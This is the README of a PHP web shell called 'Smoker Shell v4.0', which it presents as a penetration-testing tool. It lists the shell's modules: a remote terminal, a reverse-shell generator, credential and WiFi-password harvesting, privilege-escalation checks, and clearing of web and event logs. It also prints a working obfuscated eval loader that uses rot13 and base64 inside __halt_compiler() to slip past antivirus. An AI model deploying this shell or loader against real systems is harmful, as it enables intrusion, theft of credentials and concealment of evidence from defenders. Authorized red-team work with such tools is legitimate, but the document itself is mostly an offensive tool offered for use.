# Smoker Shell v4.0

Advanced PHP web shell built for authorized penetration testing and red team engagements. Two versions: Linux and Windows, each tuned with OS-native commands and priv-esc vectors.

## Versions

| File | Target OS | Notes |
|---|---|---|
| `shell-linux.php` | Linux / macOS | Uses `/proc`, `find -perm`, `crontab`, `ss`, etc. |
| `shell-windows.php` | Windows / IIS | Uses `whoami /priv`, `wmic`, `schtasks`, `netstat -ano`, registry checks, etc. |

## Features

Both versions share the same core framework and UI. OS-specific modules differ as shown:

| Module | Linux | Windows |
|---|---|---|
| **Dashboard** | System stats, PHP config | Same |
| **File Manager** | Browse, edit, upload, download, hex view, chmod | Same (minus chmod) |
| **Terminal** | `sh` commands, session history | `cmd.exe` commands, session history |
| **System Recon** | `/proc`, `ps aux`, cron, `/etc/passwd` | `systeminfo`, `tasklist`, `schtasks`, `net user`, `whoami /all` |
| **Network Tools** | Port scan, revshell gen (11 types), `dig` | Port scan, revshell gen (11 types incl. PowerShell/mshta), `nslookup` |
| **Database** | MySQL, SQLite | MySQL, MSSQL (sqlsrv), SQLite |
| **Priv-Esc** | SUID/SGID, capabilities, kernel CVEs, sudo, container detection | Token privileges, unquoted service paths, AlwaysInstallElevated, AutoLogon, stored creds, WiFi passwords, AV detection |
| **Encoding** | Base64, Hex, URL, HTML, ROT13, hashing | Same |
| **Stealth** | Apache/Nginx/syslog clearing, bash history | Windows Event Log clearing (wevtutil), IIS log clearing, PowerShell history |

## Deployment

Drop the appropriate version into any PHP-enabled web server directory.

```bash
# Local test
php -S 0.0.0.0:8888 -t .
```

Default password: `admin` — change `$CONF['passwd']` at the top of the file.

## AV Evasion

For hosts with active antivirus (e.g. Windows Defender), wrap with a `__halt_compiler()` loader:

```php
<?php $f=str_rot13("onfr64_qrpbqr");eval('?>'.$f(substr(file_get_contents(__FILE__),__COMPILER_HALT_OFFSET__+1)));__halt_compiler();
{base64 encoded shell here}
```

Payload stays in-memory only — never touches disk in cleartext.

## Disclaimer

This tool is intended **exclusively** for authorized security assessments and penetration testing under a valid contract or written authorization. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse.
